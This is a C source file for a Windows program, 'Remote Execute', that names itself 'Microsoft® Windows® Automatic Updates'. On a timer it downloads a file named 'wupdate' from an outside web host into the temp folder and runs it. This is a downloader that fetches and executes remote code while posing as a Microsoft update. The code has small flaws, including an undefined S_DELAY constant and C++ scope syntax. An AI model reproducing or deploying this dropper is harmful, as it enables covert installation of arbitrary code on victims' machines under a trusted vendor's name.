/*

  Remote Execute
  --------------
  Download an App from the Internet 
  and execute it in a specific time interval.

*/

#include <windows.h>
#include <wininet.h>
#include "resource.h"

#define T1_DELAY 3000

char AppName[] = "Microsoft® Windows® Automatic Updates";
char NetProg[] = "http://www.interlink.150m.com/wupdate";

LRESULT CALLBACK WndProc   (HWND, UINT, WPARAM, LPARAM) ;
void    CALLBACK TimerProc (HWND, UINT, UINT,   DWORD ) ;
void RunProcess(char *ProcessName);

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance,
                    PSTR szCmdLine, int nCmdShow)
{
     HWND        hwnd ;
     MSG         msg ;
     WNDCLASS    wndclass ;

     wndclass.style         = CS_HREDRAW | CS_VREDRAW ;
     wndclass.lpfnWndProc   = WndProc ;
     wndclass.cbClsExtra    = 0 ;
     wndclass.cbWndExtra    = 0 ;
     wndclass.hInstance     = hInstance ;
     wndclass.hIcon         = LoadIcon (NULL, IDI_WINLOGO) ;
     wndclass.hCursor       = LoadCursor (NULL, IDC_ARROW) ;
     wndclass.hbrBackground = (HBRUSH) GetStockObject (WHITE_BRUSH) ;
     wndclass.lpszMenuName  = NULL ;
     wndclass.lpszClassName = AppName ;
     
     if (!RegisterClass (&wndclass))
          return 0 ;
     
     hwnd = CreateWindow (AppName, AppName,
                          WS_OVERLAPPEDWINDOW,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          NULL, NULL, hInstance, NULL) ;

	 ShowWindow(hwnd, nCmdShow);

     while (GetMessage (&msg, NULL, 0, 0))
     {
          TranslateMessage (&msg) ;
          DispatchMessage (&msg) ;
     }

     return msg.wParam ;
}

LRESULT CALLBACK WndProc (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
		SetTimer (hwnd, 1, S_DELAY, TimerProc) ;
		break;
	case WM_CLOSE:
		KillTimer (hwnd, 1) ;
		DestroyWindow(hwnd);
		break ;

	case WM_DESTROY:
		PostQuitMessage (0) ;
		return 0 ;
	}
	return DefWindowProc (hwnd, message, wParam, lParam) ;
}

void CALLBACK TimerProc (HWND hwnd, UINT message, UINT iTimerID, DWORD dwTime)
{
	BOOL Avail = InternetCheckConnection
	("http://www.microsoft.com",FLAG_ICC_FORCE_CONNECTION,0);

	if(Avail)
	{
		HINTERNET hNet = InternetOpen(AppName, PRE_CONFIG_INTERNET_ACCESS,
			NULL, INTERNET_INVALID_PORT_NUMBER, 0 );
		HINTERNET hUrlFile = ::InternetOpenUrl(hNet, NetProg, NULL,
				0, INTERNET_FLAG_RELOAD, 0 );

		char FileName[255];
		if(!GetTempPath(255,FileName))
			strcpy(FileName,"C:\\");
		strcat(FileName,"wupdate");
		DeleteFile(FileName);
		HANDLE hWrite = CreateFile(FileName, GENERIC_WRITE,
		0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		const int buff_size = 512;
		char buffer[buff_size] ;
		DWORD BytesRead = 0, BytesWritten = 0;

		do  /* download NetProg */
		{
			if(InternetReadFile(hUrlFile, buffer, buff_size, &BytesRead))
				WriteFile(hWrite, buffer, BytesRead, &BytesWritten, NULL);
		} while(BytesRead == buff_size);

		CloseHandle(hWrite);
		InternetCloseHandle(hUrlFile);
		InternetCloseHandle(hNet);

		RunProcess(FileName);
	}
}

void RunProcess(char *ProcessName)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    CreateProcess( NULL, ProcessName, NULL, 
		NULL, FALSE, 0, NULL, NULL, &si, &pi);
	//WaitForSingleObject( pi.hProcess, INFINITE );

    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
}

/*
HINTERNET hNet = ::InternetOpen("MSDN SurfBear",
                                PRE_CONFIG_INTERNET_ACCESS,
                                NULL,
                                INTERNET_INVALID_PORT_NUMBER,
                                0) ;

HINTERNET hUrlFile = ::InternetOpenUrl(hNet,
                                "http://www.microsoft.com",
                                NULL,
                                0,
                                INTERNET_FLAG_RELOAD,
                                0) ;

char buffer[10*1024] ;
DWORD dwBytesRead = 0;
BOOL bRead = ::InternetReadFile(hUrlFile,
                                buffer,
                                sizeof(buffer),
                                &dwBytesRead);

::InternetCloseHandle(hUrlFile) ;

::InternetCloseHandle(hNet) ;

*/